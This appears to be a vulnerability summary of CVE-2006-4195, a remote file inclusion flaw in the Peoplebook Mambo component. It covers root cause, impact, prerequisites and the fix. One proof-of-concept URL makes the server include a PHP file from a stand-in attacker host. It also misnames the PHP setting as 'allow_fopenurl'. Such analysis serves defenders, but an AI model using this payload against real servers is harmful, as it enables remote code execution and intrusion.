Based on the provided content, here's a breakdown of the vulnerability associated with CVE-2006-4195:

**Root Cause of Vulnerability:**

*   The vulnerability lies in the `param.peoplebook.php` file of the Peoplebook Mambo Component version 1.0.
*   The script uses the `$mosConfig_absolute_path` variable to construct file paths for inclusion.
*   The script does not sanitize this variable before using it in `require_once`, making it susceptible to file inclusion attacks.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The primary vulnerability is the ability to include remote files by manipulating the `$mosConfig_absolute_path` variable.

**Impact of Exploitation:**

*   **System Access:** Successful exploitation can lead to system access on the target server.
*   **Code Execution:** By including a malicious PHP file from a remote server, an attacker can execute arbitrary code on the vulnerable system.

**Attack Vectors:**

*   **HTTP Request:** The attacker sends an HTTP GET request to `param.peoplebook.php` with a modified `mosConfig_absolute_path` parameter that points to a malicious PHP file on a remote server.
*   **Vulnerable URL:** `http://[target]/[path]/administrator/components/com_peoplebook/param.peoplebook.php?mosConfig_absolute_path= http://attacker.com/evil.txt?`

**Required Attacker Capabilities/Position:**

*   **Remote Position:** The attacker can exploit this vulnerability remotely, with no prior access required to the system.
*   **`register_globals` ON and `allow_fopenurl` ON:**  The vulnerability is exploitable if the PHP settings `register_globals` and `allow_fopenurl` are enabled on the target server.

**Additional Details:**

*   The exploit-db entry provides a detailed description of the vulnerable code snippet from `param.peoplebook.php`.
*   It also includes a proof of concept URL demonstrating how to trigger the vulnerability.
*   The entry also suggests a solution, which is to sanitize the `$mosConfig_absolute_path` variable in `param.peoplebook.php` before using it in `require_once`.
